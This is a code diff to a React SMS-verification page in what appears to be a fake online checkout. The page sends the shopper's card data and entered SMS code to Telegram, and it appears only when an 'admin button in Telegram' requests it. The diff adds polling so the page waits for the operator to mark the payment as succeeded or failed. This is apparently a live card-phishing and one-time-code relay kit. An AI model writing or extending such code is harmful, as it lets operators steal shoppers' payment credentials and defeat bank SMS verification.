@@ -10,6 +10,7 @@ const SMSVerificationPage = () => {
   const location = useLocation()
   const { t, language } = useLanguage()
   const [isVerifying, setIsVerifying] = useState(false)
+  const [isProcessing, setIsProcessing] = useState(false)
   
   // Get data from location state or localStorage
   const orderData = location.state?.orderData || JSON.parse(localStorage.getItem('pendingOrder') || '{}')
@@ -61,52 +62,75 @@ const SMSVerificationPage = () => {
     }
 
     setIsVerifying(true)
+    setIsProcessing(true)
 
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
-    // Simulate verification process (3 seconds)
-    setTimeout(() => {
-      // Clear cart and pending data
-      localStorage.removeItem('cartItems')
-      localStorage.removeItem('pendingOrder')
-      localStorage.removeItem('pendingCardData')
+    // Start polling for payment status
+    const userId = localStorage.getItem('telegram_user_id')
+    const checkPaymentStatus = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/check-payment-status/${userId}`)
+        const data = await response.json()
+        
+        if (data.paymentStatus === 'success') {
+          clearInterval(checkPaymentStatus)
+          setIsProcessing(false)
+          
+          // Clear cart and pending data
+          localStorage.removeItem('cartItems')
+          localStorage.removeItem('pendingOrder')
+          localStorage.removeItem('pendingCardData')
 
-      // Create final order data
-      const finalOrderData = {
-        ...orderData,
-        orderId: Date.now().toString(),
-        timestamp: new Date().toISOString(),
-        paymentMethod: 'Credit Card',
-        cardLast4: getCardLast4(),
-        smsVerified: true
+          // Create final order data
+          const finalOrderData = {
+            ...orderData,
+            orderId: Date.now().toString(),
+            timestamp: new Date().toISOString(),
+            paymentMethod: 'Credit Card',
+            cardLast4: getCardLast4(),
+            smsVerified: true
+          }
+
+          // Save order
+          localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))
+
+          // Track Facebook Pixel Purchase event
+          if (typeof fbq !== 'undefined') {
+            fbq('track', 'Purchase', {
+              value: orderData.total,
+              currency: 'THB',
+              content_type: 'product',
+              content_ids: orderData.cartItems.map(item => item.id),
+              num_items: orderData.cartItems.length
+            })
+          }
+
+          // Navigate to order confirmation
+          navigate('/order-confirmation', {
+            state: { orderData: finalOrderData }
+          })
+        } else if (data.paymentStatus === 'failed') {
+          clearInterval(checkPaymentStatus)
+          setIsProcessing(false)
+          navigate('/payment-failed', {
+            state: { orderData, cardData, fromSMS: true }
+          })
+        }
+      } catch (error) {
+        console.error('Error checking payment status:', error)
       }
-
-      // Save order
-      localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))
-
-      // Track Facebook Pixel Purchase event
-      if (typeof fbq !== 'undefined') {
-        fbq('track', 'Purchase', {
-          value: orderData.total,
-          currency: 'THB',
-          content_type: 'product',
-          content_ids: orderData.cartItems.map(item => item.id),
-          num_items: orderData.cartItems.length
-        })
-      }
-
-      // Navigate to order confirmation
-      navigate('/order-confirmation', {
-        state: { orderData: finalOrderData }
-      })
-    }, 3000)
+    }, 2000)
+    
+    // Store interval for cleanup
+    localStorage.setItem('paymentStatusInterval', checkPaymentStatus)
   }
 
   // Check if SMS verification is requested (set by admin button in Telegram)
   useEffect(() => {
     const checkSMSRequested = () => {
-      const userId = localStorage.getItem('userId')
+      const userId = localStorage.getItem('telegram_user_id')
       const smsRequested = localStorage.getItem(`sms_requested_${userId}`)
       
       // If not requested, redirect back to payment page
@@ -116,6 +140,15 @@ const SMSVerificationPage = () => {
     }
     
     checkSMSRequested()
+    
+    // Cleanup interval on unmount
+    return () => {
+      const intervalId = localStorage.getItem('paymentStatusInterval')
+      if (intervalId) {
+        clearInterval(parseInt(intervalId))
+        localStorage.removeItem('paymentStatusInterval')
+      }
+    }
   }, [])
 
   if (!orderData.total) {
@@ -125,7 +158,7 @@ const SMSVerificationPage = () => {
 
   return (
     <div className="sms-verification-page">
-      <LoadingSpinner isVisible={isVerifying} />
+      <LoadingSpinner isVisible={isVerifying || isProcessing} />
       
       <div className="sms-verification-container">
         <div className="sms-header">
